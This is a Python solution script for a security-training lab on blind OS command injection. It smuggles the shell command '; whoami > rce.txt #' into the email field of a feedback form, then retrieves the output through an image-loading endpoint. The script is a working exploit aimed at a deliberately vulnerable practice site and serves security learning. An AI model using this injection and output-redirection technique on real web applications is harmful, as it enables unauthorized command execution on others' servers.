# Lab: Blind OS command injection with output redirection
# difficulty: practitioner

import requests

sub = '0a0200690316cb6a847d8792005300b1'
url = f'https://{sub}.web-security-academy.net'

def main():
    header = {
        'Cookie': 'session=AMfra6pWE6sU6HKU8E1GWcmRe14lBJja'
    }

    payload = '; whoami > rce.txt #' # blind RCE
    body = {
        'csrf': 'CgV8YAZOCuyddtRIjoz62TR7OCibjIiR',
        'name': 'name',
        'email': 'email' + payload,
        'subject': 'subject',
        'message': 'message'
    }

    endpoint = '/feedback/submit'
    r = requests.post(url + endpoint, headers=header, data=body)
    print(r.status_code)

    endpoint = '/image'
    r = requests.get(url + endpoint, params='filename=rce.txt')
    print(r.text)

if __name__ == '__main__':
    main()